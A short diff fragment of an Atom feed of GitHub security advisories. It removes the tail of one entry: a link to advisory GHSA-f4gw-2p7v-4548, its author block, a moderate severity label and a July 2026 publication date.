-- &lt;https://github.com/advisories/GHSA-f4gw-2p7v-4548&gt;
-</code></pre>
-</details>]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-f4gw-2p7v-4548</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-20T22:20:18.000Z</published>
     </entry>
 </feed>
